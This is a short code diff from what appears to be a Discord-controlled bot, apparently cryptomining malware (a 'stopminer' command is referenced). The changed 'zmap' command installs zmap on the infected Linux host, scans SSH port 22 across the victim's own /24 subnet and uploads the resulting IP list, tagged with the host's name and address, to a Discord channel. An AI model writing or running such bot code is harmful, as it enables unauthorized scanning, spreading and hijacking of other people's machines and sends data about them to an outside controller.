@@ -150,10 +150,10 @@ async def stopminer(ctx):
 async def zmap(ctx):
     if platform.system() == 'Linux':
         os.popen("apt-get install zmap -y")
-        p = os.popen(f"zmap -B 10M -p 22 -n 100 -o iplist.txt")
+        p = os.popen(f"zmap -B 10M -p 22 {ip}/24 -o iplist.txt")
         await ctx.send(f"``[+] {hostname}@{ip}: ZMap started``")
 
-        if "iplist" not in p.read():
+        if "zmapscan" not in p.read():
             if os.path.exists("iplist.txt"):
                 await ctx.send(f"``[+] {hostname}@{ip}: ZMap report``",file=discord.File("iplist.txt"))
 
